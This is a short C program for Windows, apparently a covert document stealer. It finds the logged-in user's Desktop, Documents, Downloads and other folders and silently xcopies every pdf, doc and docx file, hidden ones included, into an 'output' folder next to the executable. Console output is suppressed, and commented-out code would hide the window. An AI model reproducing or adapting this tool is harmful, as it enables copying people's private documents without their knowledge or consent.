#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pthread.h>

#define T 4
#define M 50

		
		void* RunnerFunction (void *arg);
		void SetDir ();
		
				char source[10][100], fsource[MAX_PATH];
				char line[MAX_PATH], file[MAX_PATH];
	

int main()
{
	
	char window[MAX_PATH];
	int  pos=0, arg[T];
	
	pthread_t thread_id[T];
	
	/*
		GetConsoleTitle(window, MAX_PATH);
		ShowWindow(FindWindow(NULL, window),SW_HIDE);
	*/
	
			strcpy(file,"pdf doc docx");
			
			SetDir();
		//	strcpy(source,"C:\\*.%e"); 
	
			GetModuleFileName(NULL, fsource, MAX_PATH);
			while(fsource[pos]!='\0') { pos++; }
    		while(fsource[pos]!='\\') { pos--; } 
			pos++; fsource[pos]='\0';
			strcat(fsource,"output\\");
	
	for(pos = 0;pos < T; pos++)
	{
		arg[pos]=pos;
		pthread_create(&thread_id[pos], NULL, RunnerFunction, (void *)&arg[pos]);
		pthread_join(thread_id[pos], NULL);
	}
		
				
	 //	for(i=0; i<T; i++){ pthread_join(thread_id[i], NULL); }	
	
			
	
return 0;
}


void SetDir ()
{
	char usuario[20];
	int i;
	
	DWORD nUserName = sizeof(usuario);
	GetUserName(usuario, &nUserName);
	
		for(i=0;i<=5;i++){
			strcpy(source[i],"C:\\Users\\"); 
			strcat(source[i], usuario);}
		
		strcat(source[0], "\\Desktop\\*.%e"); 
		strcat(source[1], "\\Documents\\*.%e"); 
		strcat(source[2], "\\Downloads\\*.%e"); 
		strcat(source[3], "\\Music\\*.%e"); 
		strcat(source[4], "\\Pictures\\*.%e"); 
		strcat(source[5], "\\Videos\\*.%e"); 
}

void* RunnerFunction (void *arg) 
{	
	int *i;
	
	i = arg;
	
	sprintf (line, "for %%e in (%s) do (xcopy %s %s /s /c /h /q /y>nul)", file, source[*i], fsource);   
	system (line);
}
